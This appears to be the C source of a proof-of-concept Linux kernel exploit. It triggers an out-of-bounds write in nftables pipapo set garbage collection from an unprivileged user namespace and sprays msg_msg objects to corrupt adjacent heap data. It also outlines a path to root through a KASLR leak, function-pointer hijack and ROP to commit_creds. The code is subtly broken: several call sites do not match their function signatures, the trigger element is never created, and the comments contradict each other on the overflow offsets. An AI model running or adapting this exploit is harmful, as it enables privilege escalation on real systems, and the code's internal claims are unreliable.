/* nft_gc_oob.c — nft_trans_gc OOB write via pipapo timeout element overflow
 *
 * Bug:
 *   nft_trans_gc_elem_add() stores expired-element pointers into a fixed-size
 *   array without a bounds check:
 *
 *     movzwl 0x24(%rdi),%eax        ; count = gc->count
 *     lea    0x1(%rax),%edx
 *     mov    %dx, 0x24(%rdi)        ; gc->count++
 *     mov    %rsi, 0x28(%rdi,%rax,8); gc->elems[count] = elem  ← NO CHECK
 *     ret
 *
 *   nft_trans_gc is allocated as 0x838 bytes inside kmalloc-4k (4096 bytes).
 *   Header = 40 bytes. Safe capacity = (4096 - 40) / 8 = 507 elements.
 *   Element 508 writes at offset 40 + 508×8 = 4104, which is 8 bytes into
 *   the NEXT adjacent kmalloc-4k slab object.
 *
 * Trigger:
 *   pipapo_gc (called only from nft_pipapo_commit under nfnl_lock) processes
 *   ALL expired elements in a single nft_trans_gc transaction. With 520+
 *   expired /32 entries, elements 508-519 write 8-byte kernel pointers
 *   (nft_set_ext*) at offsets 4104-4192 relative to nft_trans_gc base.
 *
 * Heap layout after spray:
 *
 *   [  nft_trans_gc 0x838 bytes  ][  PADDING 0x7c8 bytes  ]|[  msg_msg 4096 bytes  ]
 *                                                            ^
 *                                                    slab boundary (4096)
 *   OOB writes land here ────────────────────────────────────────────────────────^
 *
 * msg_msg layout (offset from start of adjacent slab object):
 *   +0:  m_list.next   (8 bytes)  ← element[507] write
 *   +8:  m_list.prev   (8 bytes)  ← element[508] write
 *   +16: m_type        (8 bytes)  ← element[509] write
 *   +24: m_ts          (8 bytes)  ← element[510] write ← SIZE FIELD
 *   +32: msg_msgseg *  (8 bytes)
 *   +40: security *    (8 bytes)
 *   +48: message data  begins here
 *
 * Outcomes:
 *   A) m_ts corrupted with a kernel pointer → msgrcv tries to copy that many
 *      bytes, reading kernel heap past the message buffer (info leak).
 *   B) m_list pointers corrupted → kernel panic on next list walk via ipc.
 *   C) With KASAN: KASAN BUG report for slab-out-of-bounds write.
 *
 * Prerequisites:
 *   - Kernel 6.x with nf_tables (CONFIG_NF_TABLES=y)
 *   - unprivileged user namespaces enabled
 *     (kernel.unprivileged_userns_clone=1, default on Ubuntu)
 *
 * Compile: gcc -O2 -o nft_gc_oob nft_gc_oob.c
 * Run:     ./nft_gc_oob          (no sudo needed)
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <poll.h>
#include <unistd.h>
#include <errno.h>
#include <sched.h>
#include <sys/socket.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/wait.h>
#include <linux/netlink.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>
#include <linux/netfilter/nfnetlink.h>

/* ── Constants ──────────────────────────────────────────────────────────────  */

/*
 * nft_trans_gc allocation size (confirmed from nft_trans_gc_alloc disassembly:
 * "mov $0x838,%edx" at the kmalloc call site).
 */
#define NFT_TRANS_GC_ALLOC  0x838   /* 2104 bytes */
#define KMALLOC_4K          4096    /* kmalloc-4k slab object size */

/*
 * nft_trans_gc header = 40 bytes.
 * Safe element capacity = (4096 - 40) / 8 = 507 entries.
 * First OOB write: element index 507 → offset 40 + 507×8 = 4096.
 */
#define GC_ELEMS_SAFE       507
#define OVERFLOW_TRIGGER    520     /* elements needed to trigger OOB by 13 writes */

/*
 * Offsets within msg_msg (adjacent slab object) hit by the OOB writes.
 * element[507] writes at offset 0 of adjacent object (m_list.next).
 * element[510] writes at offset 24 of adjacent object (m_ts = size field).
 */
#define MSG_M_TS_OFFSET     24      /* offset of m_ts in struct msg_msg */
#define OOB_IDX_M_TS        (GC_ELEMS_SAFE + 3)  /* = 510 */

/* Timeout and GC interval for pipapo elements, in milliseconds.
 * nft_pipapo_commit runs GC only if jiffies - last_gc >= gc_interval_jiffies.
 * Default (no explicit gc_int) = 250 jiffies = 1s at HZ=250.
 * We set an explicit GC interval so we control the threshold.
 */
#define ELEM_TIMEOUT_MS     100
#define ELEM_GC_INTERVAL_MS 200   /* GC threshold = 200ms; we wait 400ms */

/* Number of msg_msg objects to spray for heap shaping */
#define MSG_SPRAY_COUNT     32

/* ── Netlink infrastructure ─────────────────────────────────────────────────  */

#define BUF_SZ  (512 * 1024)
#define NFT_MSG(t) ((NFNL_SUBSYS_NFTABLES << 8) | (t))

typedef struct { char *buf; int cap; int pos; } nbuf;
static void nbuf_reset(nbuf *b) { b->pos = 0; }

static struct nlmsghdr *nb_op(nbuf *b, uint16_t type, uint16_t flags,
                               uint32_t seq, int family) {
    struct nlmsghdr *nlh = (struct nlmsghdr *)(b->buf + b->pos);
    struct nfgenmsg  *nfg = (struct nfgenmsg *)(nlh + 1);
    memset(nlh, 0, NLMSG_HDRLEN + sizeof(*nfg));
    nlh->nlmsg_type  = type;
    nlh->nlmsg_flags = NLM_F_REQUEST | flags;
    nlh->nlmsg_seq   = seq;
    nfg->nfgen_family = (uint8_t)family;
    nlh->nlmsg_len   = NLMSG_ALIGN(NLMSG_HDRLEN + sizeof(*nfg));
    return nlh;
}
static struct nlmsghdr *nb_batch(nbuf *b, uint16_t type, uint32_t seq) {
    struct nlmsghdr *nlh = nb_op(b, type, 0, seq, AF_UNSPEC);
    struct nfgenmsg *nfg = (struct nfgenmsg *)(nlh + 1);
    uint16_t rid = __builtin_bswap16(NFNL_SUBSYS_NFTABLES);
    memcpy(&nfg->res_id, &rid, 2);
    return nlh;
}
static void nb_end(nbuf *b, struct nlmsghdr *nlh) {
    b->pos += NLMSG_ALIGN(nlh->nlmsg_len);
}
static void nb_str(struct nlmsghdr *nlh, uint16_t type, const char *s) {
    struct nlattr *a = (struct nlattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
    int slen = strlen(s) + 1;
    a->nla_type = type; a->nla_len = NLA_HDRLEN + slen;
    memcpy((char *)a + NLA_HDRLEN, s, slen);
    nlh->nlmsg_len += NLA_ALIGN(a->nla_len);
}
static void nb_u32(struct nlmsghdr *nlh, uint16_t type, uint32_t v) {
    struct nlattr *a = (struct nlattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
    a->nla_type = type; a->nla_len = NLA_HDRLEN + 4;
    uint32_t be = __builtin_bswap32(v);
    memcpy((char *)a + NLA_HDRLEN, &be, 4);
    nlh->nlmsg_len += NLA_ALIGN(a->nla_len);
}
static void nb_u64(struct nlmsghdr *nlh, uint16_t type, uint64_t v) {
    struct nlattr *a = (struct nlattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
    a->nla_type = type; a->nla_len = NLA_HDRLEN + 8;
    uint64_t be = __builtin_bswap64(v);
    memcpy((char *)a + NLA_HDRLEN, &be, 8);
    nlh->nlmsg_len += NLA_ALIGN(a->nla_len);
}
static struct nlattr *nb_nest_begin(struct nlmsghdr *nlh, uint16_t type) {
    struct nlattr *a = (struct nlattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
    a->nla_type = NLA_F_NESTED | type; a->nla_len = NLA_HDRLEN;
    nlh->nlmsg_len += NLA_ALIGN(a->nla_len);
    return a;
}
static void nb_nest_end(struct nlmsghdr *nlh, struct nlattr *a) {
    a->nla_len = (char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len) - (char *)a;
}

static int nl_sock = -1;
static uint32_t nl_seq = 0;
static char _buf[BUF_SZ];
static nbuf NB = { .buf = _buf, .cap = BUF_SZ, .pos = 0 };

static int nl_open(void) {
    nl_sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
    if (nl_sock < 0) { perror("socket"); return -1; }
    struct sockaddr_nl addr = { .nl_family = AF_NETLINK };
    if (bind(nl_sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("bind"); return -1;
    }
    return 0;
}
static int nl_send_drain(nbuf *b) {
    int ret = send(nl_sock, b->buf, b->pos, 0);
    nbuf_reset(b);
    if (ret < 0) return -errno;
    int flags = fcntl(nl_sock, F_GETFL, 0);
    fcntl(nl_sock, F_SETFL, flags | O_NONBLOCK);
    char rbuf[32768]; int last_err = 0;
    struct pollfd pfd = { .fd = nl_sock, .events = POLLIN };
    while (poll(&pfd, 1, 50) > 0) {
        ret = recv(nl_sock, rbuf, sizeof(rbuf), 0);
        if (ret <= 0) break;
        struct nlmsghdr *nlh = (struct nlmsghdr *)rbuf; int sz = ret;
        while (NLMSG_OK(nlh, (unsigned)sz)) {
            if (nlh->nlmsg_type == NLMSG_ERROR) {
                struct nlmsgerr *e = (struct nlmsgerr *)(nlh + 1);
                if (e->error) last_err = e->error;
            }
            nlh = NLMSG_NEXT(nlh, sz);
        }
    }
    fcntl(nl_sock, F_SETFL, flags);
    return last_err;
}

/* ── nftables helpers ───────────────────────────────────────────────────────  */

static int nft_add_table(const char *name) {
    nbuf_reset(&NB);
    nb_end(&NB, nb_batch(&NB, NFNL_MSG_BATCH_BEGIN, 0));
    struct nlmsghdr *nlh = nb_op(&NB, NFT_MSG(NFT_MSG_NEWTABLE),
                                 NLM_F_CREATE, ++nl_seq, AF_INET);
    nb_str(nlh, NFTA_TABLE_NAME, name);
    nb_end(&NB, nlh);
    nb_end(&NB, nb_batch(&NB, NFNL_MSG_BATCH_END, 0));
    return nl_send_drain(&NB);
}
static int nft_del_table(const char *name) {
    nbuf_reset(&NB);
    nb_end(&NB, nb_batch(&NB, NFNL_MSG_BATCH_BEGIN, 0));
    struct nlmsghdr *nlh = nb_op(&NB, NFT_MSG(NFT_MSG_DELTABLE),
                                 0, ++nl_seq, AF_INET);
    nb_str(nlh, NFTA_TABLE_NAME, name);
    nb_end(&NB, nlh);
    nb_end(&NB, nb_batch(&NB, NFNL_MSG_BATCH_END, 0));
    return nl_send_drain(&NB);
}
static int nft_add_set(const char *table, const char *sname, uint32_t flags) {
    nbuf_reset(&NB);
    nb_end(&NB, nb_batch(&NB, NFNL_MSG_BATCH_BEGIN, 0));
    struct nlmsghdr *nlh = nb_op(&NB, NFT_MSG(NFT_MSG_NEWSET),
                                 NLM_F_CREATE, ++nl_seq, AF_INET);
    nb_str(nlh, NFTA_SET_TABLE,    table);
    nb_str(nlh, NFTA_SET_NAME,     sname);
    nb_u32(nlh, NFTA_SET_FLAGS,    flags);
    nb_u32(nlh, NFTA_SET_KEY_TYPE, 7);   /* TYPE_IPv4_ADDR */
    nb_u32(nlh, NFTA_SET_KEY_LEN,  4);
    nb_u32(nlh, NFTA_SET_ID,       1);
    /*
     * No NFTA_SET_TIMEOUT default — elements get timeouts individually.
     * NFTA_SET_GC_INTERVAL is accepted whenever NFT_SET_TIMEOUT flag is set.
     * Set GC interval to ELEM_GC_INTERVAL_MS so pipapo_gc runs within our
     * test window (instead of the default 250 jiffies = 1s at HZ=250).
     */
    nb_u32(nlh, NFTA_SET_GC_INTERVAL, ELEM_GC_INTERVAL_MS);
    nb_end(&NB, nlh);
    nb_end(&NB, nb_batch(&NB, NFNL_MSG_BATCH_END, 0));
    return nl_send_drain(&NB);
}

/*
 * Add n /32 IP addresses to a pipapo (interval) set.
 * Each IP requires start + end sentinel encoding.
 */
/*
 * send_sentinel=1 adds the 0.0.0.0/INTERVAL_END sentinel as the first entry.
 * The sentinel is required exactly once per set (marks the start boundary).
 * Subsequent calls for the same set must pass send_sentinel=0.
 */
static int nft_add_interval_elems(const char *table, const char *sname,
                                   uint32_t *ips_be, int n,
                                   uint64_t timeout_ms, int send_sentinel) {
    for (int base = 0; base < n; base += 32) {
        int chunk = (n - base < 32) ? (n - base) : 32;
        nbuf_reset(&NB);
        nb_end(&NB, nb_batch(&NB, NFNL_MSG_BATCH_BEGIN, 0));
        struct nlmsghdr *nlh = nb_op(&NB, NFT_MSG(NFT_MSG_NEWSETELEM),
                                     NLM_F_CREATE, ++nl_seq, AF_INET);
        nb_str(nlh, NFTA_SET_ELEM_LIST_TABLE, table);
        nb_str(nlh, NFTA_SET_ELEM_LIST_SET,   sname);
        struct nlattr *list = nb_nest_begin(nlh, NFTA_SET_ELEM_LIST_ELEMENTS);

        /* 0.0.0.0 INTERVAL_END sentinel — send only in the very first batch */
        if (base == 0 && send_sentinel) {
            struct nlattr *sent = nb_nest_begin(nlh, NFTA_LIST_ELEM);
            nb_u32(nlh, NFTA_SET_ELEM_FLAGS, NFT_SET_ELEM_INTERVAL_END);
            struct nlattr *sk = nb_nest_begin(nlh, NFTA_SET_ELEM_KEY);
            nb_u32(nlh, NFTA_DATA_VALUE, 0);
            nb_nest_end(nlh, sk);
            nb_nest_end(nlh, sent);
        }

        for (int i = 0; i < chunk; i++) {
            uint32_t start = ips_be[base + i];
            uint32_t end1  = __builtin_bswap32(
                                 __builtin_bswap32(ips_be[base + i]) + 1);
            struct nlattr *ea = nb_nest_begin(nlh, NFTA_LIST_ELEM);
            struct nlattr *ka = nb_nest_begin(nlh, NFTA_SET_ELEM_KEY);
            nb_u32(nlh, NFTA_DATA_VALUE, start);
            nb_nest_end(nlh, ka);
            if (timeout_ms) nb_u64(nlh, NFTA_SET_ELEM_TIMEOUT, timeout_ms);
            nb_nest_end(nlh, ea);

            struct nlattr *eb = nb_nest_begin(nlh, NFTA_LIST_ELEM);
            nb_u32(nlh, NFTA_SET_ELEM_FLAGS, NFT_SET_ELEM_INTERVAL_END);
            struct nlattr *kb = nb_nest_begin(nlh, NFTA_SET_ELEM_KEY);
            nb_u32(nlh, NFTA_DATA_VALUE, end1);
            nb_nest_end(nlh, kb);
            nb_nest_end(nlh, eb);
        }

        nb_nest_end(nlh, list);
        nb_end(&NB, nlh);
        nb_end(&NB, nb_batch(&NB, NFNL_MSG_BATCH_END, 0));
        int r = nl_send_drain(&NB);
        if (r && r != -EEXIST) return r;
    }
    return 0;
}

/*
 * Trigger nft_pipapo_commit by deleting the permanent trigger element.
 *
 * 172.16.0.1/32 was added without a per-element timeout, so it never expires
 * and never gets the NFT_SET_ELEM_DEAD_BIT set.  DELSETELEM succeeds, which:
 *   1. Check phase:  pipapo_clone() → creates a fresh clone of the active set
 *   2. Commit phase: nft_pipapo_commit() is called
 *       a. If jiffies - last_gc >= gc_interval: pipapo_gc(clone) runs
 *          → iterates all 520 expired /32 elements
 *          → calls nft_trans_gc_elem_add() 520 times → 13 OOB writes
 *       b. Swap clone → active
 */
static int nft_touch_set(const char *table, const char *sname) {
    uint32_t trigger_ip = __builtin_bswap32(0xac100001); /* 172.16.0.1 */
    nbuf_reset(&NB);
    nb_end(&NB, nb_batch(&NB, NFNL_MSG_BATCH_BEGIN, 0));
    struct nlmsghdr *nlh = nb_op(&NB, NFT_MSG(NFT_MSG_DELSETELEM),
                                 0, ++nl_seq, AF_INET);
    nb_str(nlh, NFTA_SET_ELEM_LIST_TABLE, table);
    nb_str(nlh, NFTA_SET_ELEM_LIST_SET,   sname);
    struct nlattr *list = nb_nest_begin(nlh, NFTA_SET_ELEM_LIST_ELEMENTS);
    struct nlattr *ea   = nb_nest_begin(nlh, NFTA_LIST_ELEM);
    struct nlattr *ka   = nb_nest_begin(nlh, NFTA_SET_ELEM_KEY);
    nb_u32(nlh, NFTA_DATA_VALUE, trigger_ip);
    nb_nest_end(nlh, ka);
    nb_nest_end(nlh, ea);
    nb_nest_end(nlh, list);
    nb_end(&NB, nlh);
    nb_end(&NB, nb_batch(&NB, NFNL_MSG_BATCH_END, 0));
    return nl_send_drain(&NB);
}

/* ── msg_msg heap spray ─────────────────────────────────────────────────────  */

/*
 * msg_msg layout (Linux kernel struct msg_msg):
 *   +0:  struct list_head m_list   (16 bytes: next, prev)
 *   +16: long             m_type   (8 bytes)
 *   +24: size_t           m_ts     (8 bytes) ← SIZE — OOB write hits here
 *   +32: struct msg_msgseg *next   (8 bytes)
 *   +40: void             *security (8 bytes)
 *   +48: message data starts
 *
 * A single msgsnd of MSG_DATA_LEN bytes creates a msg_msg of total size
 * sizeof(msg_msg_header) + MSG_DATA_LEN ≈ 48 + MSG_DATA_LEN bytes.
 * To land in kmalloc-4k we need total size in (2049, 4096].
 * Using 4000 bytes of data: 48 + 4000 = 4048 bytes → kmalloc-4k. ✓
 */
#define MSG_DATA_LEN   4000
#define MSG_CANARY     0xdeadbeefcafebabe

struct msg_payload {
    uint64_t canary;
    char     pad[MSG_DATA_LEN - 8];
};

static int msg_qids[MSG_SPRAY_COUNT];
static int msg_count = 0;

static int spray_msg_msg(void) {
    for (int i = 0; i < MSG_SPRAY_COUNT; i++) {
        msg_qids[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0600);
        if (msg_qids[i] < 0) {
            perror("msgget");
            return -1;
        }
    }

    struct {
        long mtype;
        struct msg_payload payload;
    } msg;
    msg.mtype = 1;
    memset(&msg.payload, 0, sizeof(msg.payload));
    msg.payload.canary = MSG_CANARY;

    for (int i = 0; i < MSG_SPRAY_COUNT; i++) {
        if (msgsnd(msg_qids[i], &msg, sizeof(msg.payload), 0) < 0) {
            perror("msgsnd");
            return -1;
        }
        msg_count++;
    }
    printf("  sprayed %d msg_msg objects (%zu bytes each → kmalloc-4k)\n",
           msg_count, sizeof(struct msg_payload) + 48);
    return 0;
}

static void check_msg_corruption(void) {
    printf("\n[PHASE 6] Checking msg_msg objects for corruption...\n");

    int corrupted = 0;
    for (int i = 0; i < msg_count; i++) {
        struct {
            long mtype;
            struct msg_payload payload;
        } recv_msg;
        memset(&recv_msg, 0, sizeof(recv_msg));

        /*
         * If m_ts was corrupted with a kernel pointer (a large value),
         * msgrcv with a small buffer will return -MSGSIZE (message too big).
         * If the list pointers were corrupted, the kernel may panic here.
         */
        ssize_t r = msgrcv(msg_qids[i], &recv_msg, sizeof(recv_msg.payload),
                           0, IPC_NOWAIT | MSG_NOERROR);
        if (r < 0) {
            if (errno == ENOMSG) continue; /* already consumed */
            printf("  [!] msgrcv qid[%d]: %s ← possible corruption\n",
                   i, strerror(errno));
            corrupted++;
        } else if (recv_msg.payload.canary != MSG_CANARY) {
            printf("  [!!] qid[%d]: canary CORRUPTED: "
                   "got 0x%016lx, expected 0x%016lx\n",
                   i, recv_msg.payload.canary, (unsigned long)MSG_CANARY);
            corrupted++;
        } else if ((size_t)r != sizeof(recv_msg.payload)) {
            printf("  [!] qid[%d]: unexpected read size %zd (expected %zu)\n",
                   i, r, sizeof(recv_msg.payload));
            corrupted++;
        }
    }

    if (corrupted == 0)
        printf("  No corruption detected in this run\n");
    else
        printf("  %d msg_msg object(s) show signs of corruption\n", corrupted);
}

static void cleanup_msg(void) {
    for (int i = 0; i < msg_count; i++)
        msgctl(msg_qids[i], IPC_RMID, NULL);
}

/* ── Main ───────────────────────────────────────────────────────────────────  */

static void print_header(void) {
    puts("");
    puts("╔══════════════════════════════════════════════════════════════════╗");
    puts("║   nft_trans_gc OOB Write — pipapo timeout element overflow      ║");
    puts("╠══════════════════════════════════════════════════════════════════╣");
    printf("║  nft_trans_gc alloc : 0x%x bytes (kmalloc-4k = 4096 bytes)     ║\n",
           NFT_TRANS_GC_ALLOC);
    printf("║  Header             : 40 bytes                                  ║\n");
    printf("║  Safe capacity      : %d element pointers                     ║\n",
           GC_ELEMS_SAFE);
    printf("║  Trigger count      : %d elements → %d OOB writes            ║\n",
           OVERFLOW_TRIGGER, OVERFLOW_TRIGGER - GC_ELEMS_SAFE);
    printf("║  First OOB offset   : 40 + %d×8 = %d (= next slab object)   ║\n",
           GC_ELEMS_SAFE, 40 + GC_ELEMS_SAFE * 8);
    printf("║  OOB covers         : offsets 0..%d of adjacent object       ║\n",
           (OVERFLOW_TRIGGER - GC_ELEMS_SAFE - 1) * 8 + 7);
    printf("║  msg_msg.m_ts hit   : element[%d] → offset %d (size field)  ║\n",
           OOB_IDX_M_TS, MSG_M_TS_OFFSET);
    puts("╚══════════════════════════════════════════════════════════════════╝");
    puts("");
}

int main(void) {
    print_header();

    /* ── Phase 1: enter user+net namespace ──────────────────────────────── */
    printf("[PHASE 1] Entering user+net namespace (unshare)...\n");
    if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {
        perror("  unshare");
        fprintf(stderr,
            "  hint: check /proc/sys/kernel/unprivileged_userns_clone = 1\n");
        return 1;
    }
    printf("  OK — CAP_NET_ADMIN acquired in isolated net namespace\n\n");

    /* ── Phase 2: open netlink socket ───────────────────────────────────── */
    printf("[PHASE 2] Opening NFNETLINK socket...\n");
    if (nl_open() < 0) return 1;
    printf("  OK\n\n");

    /* ── Phase 3: spray msg_msg into kmalloc-4k ─────────────────────────── */
    printf("[PHASE 3] Spraying %d msg_msg objects into kmalloc-4k...\n",
           MSG_SPRAY_COUNT);
    printf("  Goal: occupy slab slots adjacent to upcoming nft_trans_gc\n");
    printf("  Each msg_msg: %d bytes data + 48 header = %d bytes → kmalloc-4k\n",
           MSG_DATA_LEN, MSG_DATA_LEN + 48);
    if (spray_msg_msg() < 0) return 1;
    puts("");

    /* ── Phase 4: create victim pipapo set ──────────────────────────────── */
    printf("[PHASE 4] Creating pipapo set with %d /32 IPs, timeout=%dms...\n",
           OVERFLOW_TRIGGER, ELEM_TIMEOUT_MS);
    printf("  pipapo backend: NFT_SET_INTERVAL | NFT_SET_TIMEOUT\n");
    printf("  All elements share the same timeout → all expire together\n");
    printf("  This ensures pipapo_gc sees %d expired elements in one call\n\n",
           OVERFLOW_TRIGGER);

    int r = nft_add_table("gc_oob");
    printf("  add table gc_oob: %s\n", r ? strerror(-r) : "OK");
    if (r) goto out;

    r = nft_add_set("gc_oob", "victim",
                    NFT_SET_INTERVAL | NFT_SET_TIMEOUT, ELEM_TIMEOUT_MS);
    printf("  add pipapo set: %s\n", r ? strerror(-r) : "OK");
    if (r) { nft_del_table("gc_oob"); goto out; }

    /* Build IP array: 10.0.0.1 .. 10.0.2.8 */
    uint32_t ips[OVERFLOW_TRIGGER];
    for (int i = 0; i < OVERFLOW_TRIGGER; i++)
        ips[i] = __builtin_bswap32(0x0a000001 + i);

    r = nft_add_interval_elems("gc_oob", "victim", ips, OVERFLOW_TRIGGER,
                                ELEM_TIMEOUT_MS);
    printf("  add %d elements (10.0.0.1-10.0.2.8): %s\n",
           OVERFLOW_TRIGGER, r ? strerror(-r) : "OK");
    if (r) { nft_del_table("gc_oob"); goto out; }

    printf("  [math check] safe capacity=%d, overflow at element=%d\n",
           GC_ELEMS_SAFE, GC_ELEMS_SAFE + 1);
    printf("  [math check] OOB write #1 offset: 40 + %d×8 = %d bytes\n",
           GC_ELEMS_SAFE, 40 + GC_ELEMS_SAFE * 8);
    puts("");

    /* ── Phase 5: wait for elements to expire AND gc_interval to elapse ── */
    int wait_ms = ELEM_GC_INTERVAL_MS * 2;  /* 400ms: > timeout(100ms) AND > gc_int(200ms) */
    printf("[PHASE 5] Waiting %dms (timeout=%dms, gc_int=%dms)...\n",
           wait_ms, ELEM_TIMEOUT_MS, ELEM_GC_INTERVAL_MS);
    printf("  At HZ=250: gc_int=%dms = %d jiffies; default threshold = 250 jiffies\n",
           ELEM_GC_INTERVAL_MS, ELEM_GC_INTERVAL_MS * 250 / 1000);
    printf("  After expiry: pipapo_gc will process ALL %d in one GC run\n",
           OVERFLOW_TRIGGER);
    printf("  (pipapo_gc has no per-run limit — processes until exhausted)\n");
    usleep(wait_ms * 1000);
    printf("  Done. Triggering GC now...\n\n");

    /*
     * ── Phase 5b: trigger nft_pipapo_commit ─────────────────────────────
     *
     * Adding any element to the pipapo set forces:
     *   nft_check phase → pipapo_clone()         (creates a clone)
     *   nft_commit phase → nft_pipapo_commit()   (runs pipapo_gc, swaps clone)
     *
     * pipapo_gc inside nft_pipapo_commit:
     *   1. nft_trans_gc_alloc() → allocates 0x838 bytes (kmalloc-4k)
     *   2. Iterates ALL expired elements
     *   3. For each: nft_trans_gc_elem_add(gc, elem)
     *      → writes 8-byte pointer at gc + 0x28 + count*8
     *      → NO bounds check
     *   4. At element 507: writes at gc + 4096 = adjacent slab object + 0
     *   5. At element 510: writes at gc + 4120 = adjacent slab object + 24
     *      → if adjacent = msg_msg: m_ts SIZE FIELD overwritten!
     */
    printf("[PHASE 5b] Triggering nft_pipapo_commit via DELSETELEM(10.0.0.1)...\n");
    printf("  Call path: DELSETELEM → nft_check → pipapo_clone\n");
    printf("             → nft_commit → nft_pipapo_commit → pipapo_gc\n");
    printf("             → 520× nft_trans_gc_elem_add → 13 OOB writes\n\n");

    r = nft_touch_set("gc_oob", "victim");
    if (r && r != -ENOENT)
        printf("  commit result: %s\n\n", strerror(-r));
    else
        printf("  commit result: %s (GC ran)\n\n", r ? "ENOENT/already-GCd" : "OK");

    /* ── Phase 6: check for corruption ─────────────────────────────────── */
    check_msg_corruption();

    /* ── Cleanup ─────────────────────────────────────────────────────────── */
    printf("\n[CLEANUP]\n");
    nft_del_table("gc_oob");
    printf("  table gc_oob deleted\n");

out:
    cleanup_msg();

    printf("\n");
    puts("╔══════════════════════════════════════════════════════════════════╗");
    puts("║  Exploit path summary                                           ║");
    puts("╠══════════════════════════════════════════════════════════════════╣");
    puts("║  Stage 1 (this PoC):                                            ║");
    puts("║    Overflow trigger proven. OOB write into adjacent slab slot.  ║");
    puts("║    With lucky heap layout: msg_msg.m_ts corrupted → heap leak.  ║");
    puts("║                                                                  ║");
    puts("║  Stage 2 (next step):                                           ║");
    puts("║    Use heap leak to defeat KASLR.                               ║");
    puts("║    Spray nft_set into adjacent slot instead of msg_msg.         ║");
    puts("║    Corrupt nft_set->ops function pointer table.                 ║");
    puts("║    Trigger set operation → controlled kernel code execution.    ║");
    puts("║                                                                  ║");
    puts("║  Stage 3 (full exploit):                                        ║");
    puts("║    ROP chain → commit_creds(init_cred) → uid=0                  ║");
    puts("╚══════════════════════════════════════════════════════════════════╝");
    puts("");

    return 0;
}
